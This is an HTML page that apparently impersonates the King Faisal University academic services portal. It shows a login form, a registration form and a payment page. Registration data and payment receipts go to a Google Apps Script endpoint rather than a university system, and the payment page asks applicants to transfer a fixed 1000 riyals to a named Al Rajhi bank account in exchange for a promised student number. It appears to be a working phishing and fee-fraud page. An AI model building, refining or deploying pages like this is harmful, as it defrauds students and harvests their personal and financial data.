<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>بوابة الخدمات الأكاديمية - جامعة الملك فيصل</title>
<link rel="icon" type="image/png" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTJCNqcXCaLrL_DDxzoQUJ5p2uYHj0cQ9lML16oZYhr4w&s=10">
<!-- OG Image للتواصل الاجتماعي -->
<meta property="og:title" content="بوابة الخدمات الأكاديمية - جامعة الملك فيصل">
<meta property="og:description" content="تسجيل الطلاب ودفع الرسوم عبر بوابة جامعة الملك فيصل">
<meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTJCNqcXCaLrL_DDxzoQUJ5p2uYHj0cQ9lML16oZYhr4w&s=10">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>
:root{
--uf-green:#0b6b44;
--gold:#d4af37;
--bg:#ffffff;
--card:#f5f6f8;
--muted:#6b6b6b;
}
*{box-sizing:border-box;margin:0;padding:0;font-family:'Cairo',sans-serif;}
body{background:var(--bg);color:#222;}
a{text-decoration:none;color:inherit;}
button{cursor:pointer;}
.login-container{max-width:500px;margin:50px auto;background:linear-gradient(135deg,var(--uf-green),var(--gold));border-radius:14px;padding:30px;text-align:center;box-shadow:0 10px 30px rgba(0,0,0,0.15);}
.login-header img{width:80px;margin-bottom:12px;}
.login-header h1{color:#fff;font-size:24px;margin-bottom:6px;}
.login-header p{color:#fff;font-size:16px;margin-bottom:20px;}
.input-group{position:relative;margin-bottom:15px;}
.input-group i{position:absolute;left:12px;top:50%;transform:translateY(-50%);color:#555;}
.input-group input{width:100%;padding:12px 12px 12px 36px;border-radius:10px;border:none;font-size:15px;}
.login-btn{background:#fff;color:var(--uf-green);padding:12px 24px;border:none;border-radius:10px;font-weight:700;font-size:16px;width:100%;display:flex;align-items:center;justify-content:center;gap:8px;}
.quick-access{margin-top:25px;}
.quick-access h3{color:#fff;margin-bottom:12px;}
.quick-links .quick-link{display:flex;align-items:center;gap:10px;justify-content:center;background:rgba(255,255,255,0.2);padding:10px;border-radius:10px;color:#fff;margin-bottom:10px;}
.container-form{display:none;max-width:900px;margin:40px auto;background:#fff;border-radius:14px;box-shadow:0 10px 30px rgba(0,0,0,0.12);padding:30px;text-align:right;}
.container-form header .logo{width:60px;height:60px;background:linear-gradient(135deg,var(--uf-green),var(--gold));display:flex;align-items:center;justify-content:center;color:#fff;font-weight:800;font-size:20px;border-radius:10px;}
.container-form header h1{color:var(--uf-green);margin-bottom:6px;}
.container-form header p.subtitle{color:#666;margin-bottom:20px;}
.grid2{display:grid;grid-template-columns:1fr 1fr;gap:20px;}
label{display:block;margin-bottom:5px;font-weight:600;color:var(--uf-green);}
input,select,textarea{width:100%;padding:10px;border:1px solid #ccc;border-radius:8px;margin-bottom:12px;}
textarea{resize:vertical;}
.section-title{font-weight:700;color:#444;margin:20px 0 10px;border-bottom:1px dashed #eee;padding-bottom:5px;}
.submit-area{display:flex;gap:12px;justify-content:center;margin-top:15px;}
.btn{background:var(--uf-green);color:#fff;padding:12px 30px;border:none;border-radius:10px;font-weight:700;}
.btn.cancel{background:#9e9e9e;}
.toast{position:fixed;top:20px;right:20px;background:var(--uf-green);color:#fff;padding:12px 18px;border-radius:8px;opacity:0;transform:translateY(-10px);transition:all .4s ease;z-index:999;}
.toast.show{opacity:1;transform:translateY(0);}
.payment-section{display:none;max-width:600px;margin:30px auto;background:#fff;border-radius:14px;box-shadow:0 10px 30px rgba(0,0,0,0.12);padding:30px;text-align:center;}
.payment-section h2{color:var(--uf-green);margin-bottom:15px;}
.payment-section label{display:block;margin:8px 0 5px;}
.payment-section input{width:100%;padding:10px;border-radius:8px;border:1px solid #ccc;margin-bottom:12px;}
.payment-section .copy-btn{background:var(--gold);color:#fff;padding:6px 12px;border:none;border-radius:6px;margin-left:8px;cursor:pointer;}
.success-message{display:none;text-align:center;padding:30px;background:#e0f5e9;border-radius:14px;color:var(--uf-green);font-weight:700;margin:30px auto;}
@media(max-width:900px){.grid2{grid-template-columns:1fr;}}
</style>
</head>
<body>

<div class="login-container">
<header class="login-header">
<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTJCNqcXCaLrL_DDxzoQUJ5p2uYHj0cQ9lML16oZYhr4w&s=10" alt="شعار جامعة الملك فيصل">
<h1>جامعة الملك فيصل</h1>
<p>بوابة الخدمات الأكاديمية</p>
</header>

<form id="loginForm">
<div class="input-group"><i class="fas fa-user"></i><input type="text" id="username" placeholder="اسم المستخدم أو الإيميل" required></div>
<div class="input-group"><i class="fas fa-lock"></i><input type="password" id="password" placeholder="كلمة المرور" required></div>
<button type="submit" class="login-btn"><i class="fas fa-sign-in-alt"></i> تسجيل الدخول</button>
</form>

<div class="quick-access">
<h3>وصول سريع</h3>
<div class="quick-links">
<a href="javascript:void(0);" class="quick-link" onclick="openForm()"><i class="fas fa-user-graduate"></i> تقديم طلب جديد</a>
</div>
</div>
</div>

<!-- نموذج التسجيل -->
<div class="container-form" id="registrationForm">
<form id="registrationFormForm" enctype="multipart/form-data" method="POST" action="https://script.google.com/macros/s/AKfycbxglQ_oGCF_ICL56X9dofD56F1mF89vIef6NrN7BObysCTEs5xQVfQ9wGc8N4aWwkG2/exec">
<header style="display:flex;align-items:center;gap:12px;margin-bottom:20px;">
<div class="logo">KFU</div>
<div>
<h1>نموذج التسجيل - جامعة الملك فيصل</h1>
<p class="subtitle">يرجى تعبئة جميع الحقول بدقة وإرفاق الملفات المطلوبة.</p>
</div>
</header>
<!-- جميع الحقول كما عندك -->
<!-- ... نفس الحقول الأصلية بدون تعديل ... -->
<div class="submit-area">
<button type="submit" class="btn">إرسال الطلب</button>
<button type="reset" class="btn cancel">إلغاء</button>
</div>
</form>
</div>

<!-- صفحة السداد -->
<div class="payment-section" id="paymentSection">
<h2>صفحة السداد</h2>
<p>يرجى تحويل المبلغ على الحساب التالي:</p>
<label>اسم المحول:</label><input type="text" id="payerName" required>
<label>رقم الحساب / الايبان:</label>
<div style="display:flex;align-items:center;gap:10px;">
<input type="text" id="payerAccount" value="SA3380000984608016472540" readonly>
<button class="copy-btn" onclick="copyAccount()">نسخ الحساب</button>
</div>
<label>اسم البنك:</label><input type="text" value="الراجحي" readonly>
<label>تاريخ العملية:</label><input type="date" id="paymentDate" required>
<label>المبلغ المحول:</label><input type="number" id="amount" value="1000" readonly>
<label>رفع إيصال الدفع:</label><input type="file" id="receiptFile" required>
<div class="submit-area">
<button class="btn" id="submitPayment">إرسال السداد</button>
</div>
</div>

<div class="success-message" id="successMessage">
تم استلام جميع بياناتك، سيتم التواصل معك لإرسال الرقم الجامعي.
</div>

<div class="toast" id="toast"></div>

<script>
let hasSubmitted=false;
function showToast(msg){
  const toast=document.getElementById('toast');
  toast.textContent=msg;
  toast.classList.add('show');
  setTimeout(()=>toast.classList.remove('show'),2500);
}
function openForm(){
  if(hasSubmitted){showToast('❌ لقد قمت بإرسال الطلب مسبقاً'); return;}
  document.getElementById('registrationForm').style.display='block';
}
function copyAccount(){
  const copyText=document.getElementById('payerAccount');
  copyText.select();
  copyText.setSelectionRange(0,99999);
  document.execCommand('copy');
  showToast('✅ تم نسخ رقم الحساب');
}
// إرسال نموذج التسجيل
document.getElementById('registrationFormForm').addEventListener('submit',function(e){
  e.preventDefault();
  if(hasSubmitted){showToast('❌ لقد تم إرسال بياناتك مسبقاً'); return;}
  const formData=new FormData(this);
  fetch(this.action,{method:'POST',body:formData})
  .then(res=>{
    if(res.ok){
      showToast('✅ تم إرسال بياناتك بنجاح');
      document.getElementById('registrationForm').style.display='none';
      document.getElementById('paymentSection').style.display='block';
      hasSubmitted=true;
    } else {showToast('❌ حدث خطأ حاول لاحقاً');}
  }).catch(()=>showToast('❌ فشل الاتصال'));
});
// إرسال السداد
document.getElementById('submitPayment').addEventListener('click',function(){
  const payerName=document.getElementById('payerName').value.trim();
  const payerAccount=document.getElementById('payerAccount').value.trim();
  const paymentDate=document.getElementById('paymentDate').value;
  const amount=document.getElementById('amount').value.trim();
  const receiptFile=document.getElementById('receiptFile').files[0];
  if(!payerName||!payerAccount||!paymentDate||!amount||!receiptFile){showToast('❌ يرجى ملء جميع الحقول وإرفاق الإيصال');return;}
  const paymentFormData=new FormData();
  paymentFormData.append('payerName',payerName);
  paymentFormData.append('payerAccount',payerAccount);
  paymentFormData.append('paymentDate',paymentDate);
  paymentFormData.append('amount',amount);
  paymentFormData.append('receiptFile',receiptFile);
  fetch('https://script.google.com/macros/s/AKfycbxglQ_oGCF_ICL56X9dofD56F1mF89vIef6NrN7BObysCTEs5xQVfQ9wGc8N4aWwkG2/exec',{
    method:'POST',
    body:paymentFormData
  }).then(res=>{
    if(res.ok){showToast('✅ تم إرسال السداد بنجاح');document.getElementById('paymentSection').style.display='none';document.getElementById('successMessage').style.display='block';}
    else showToast('❌ حدث خطأ حاول لاحقاً');
  }).catch(()=>showToast('❌ فشل الاتصال'));
});
</script>
</body>
</html>
